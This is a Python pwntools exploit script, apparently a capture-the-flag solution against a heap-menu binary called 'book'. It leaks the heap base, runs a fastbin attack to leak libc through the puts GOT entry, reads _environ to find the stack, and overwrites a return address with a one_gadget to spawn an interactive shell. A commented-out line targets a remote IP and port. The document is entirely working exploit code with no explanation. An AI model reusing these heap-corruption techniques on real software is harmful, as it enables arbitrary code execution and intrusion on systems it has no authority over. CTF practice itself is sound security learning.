from pwn import *
context.log_level='debug'
sh= process('./book')#['./book'],env={"LD_PRELOAD":"./libc-2.23.so"})
#sh =remote('159.65.68.241','10004')
elf = ELF('./book')
libc = ELF('libc-2.23.so')

def add(a_name,size,b_name):
	sh.recvuntil('Your choice:\n')
	sh.sendline('1')
	sh.recvuntil('author name?\n')
	sh.sendline(a_name)
	sh.recvuntil('book name?\n')
	sh.sendline(str(size))
	sh.recvuntil('book?\n')
	sh.sendline(b_name)

def read(idx):
	sh.recvuntil('Your choice:\n')
	sh.sendline('3')
	sh.recvuntil('sell?\n')
	sh.sendline(str(idx))

def delete(idx):
	sh.recvuntil('Your choice:\n')
	sh.sendline('2')
	sh.recvuntil('sell?\n')
	sh.sendline(str(idx))

add('a',0,'b')
add('c',0,'d')
add('e',0,'f')
add('g',0,'h')
add('i',0,'j')
#--------leak heap_base-----------------#
delete(2)
delete(1)
delete(0)

add(p64(0)+p64(0x21),0,'b'*0x20)
read(0)
sh.recvuntil('b'*0x20)
heap_base = u64(sh.recvuntil('\n').strip('\n').ljust(8,'\x00'))-0x40
print 'heap_base : '+hex(heap_base)
gdb.attach(sh)

#---------fastbin_attack leak libc_base-----------------#
delete(4)
delete(3)
add('A',0,'b'*0x10+p64(0)+p64(0x21)+p64(0x602060))
#gdb.attach(sh)
add('f',0,'wwwwwwww')
add('a',0,'a'*0x10+p64(elf.got['puts']))
#gdb.attach(sh)
read(0)
sh.recvuntil('name:')
puts_got = u64(sh.recvuntil('\n').strip('\n').ljust(8,'\x00'))
libc_base = puts_got- libc.symbols['puts']
print 'libc_base : '+hex(libc_base) 
environ_ptr_addr = libc_base + libc.symbols['_environ']
print 'environ_ptr_addr : '+ hex(environ_ptr_addr)
#gdb.attach(sh)

#---------get shell-------------------------------#
one_gadget_off = 0x45216
one_gadget_addr = one_gadget_off + libc_base
#malloc_hook_addr = libc_base + 0x3c4b10
delete(3)
add('a',0,'b'*0x10+p64(environ_ptr_addr))
read(0)
sh.recvuntil('name:')
environ_addr = u64(sh.recvuntil('\n').strip('\n').ljust(8,'\x00'))
rbp_addr = environ_addr-0xf8
print 'one_gadget_addr : '+hex(one_gadget_addr)
#print 'malloc_hook_addr : '+hex(malloc_hook_addr)
print 'rbp_addr : '+hex(rbp_addr)


delete(3)
add('a',0,'b'*0x10+p64(0x602070)+p64(0x21)+'b'*0x18+p64(0x41)+'c'*0x20+p64(0x6020b0)+'d'*0x10+p64(0x21))
delete(2)
delete(0)
add('a',0,'b'*0x10+p64(0x602070)+p64(0x21)+'b'*0x18+p64(0x41)+p64(rbp_addr-0x1e))
add('\n',0x30,'\n')
add('c',0x30,'a'*0x16+p64(one_gadget_addr))
sh.sendline('4')
sh.interactive()

	
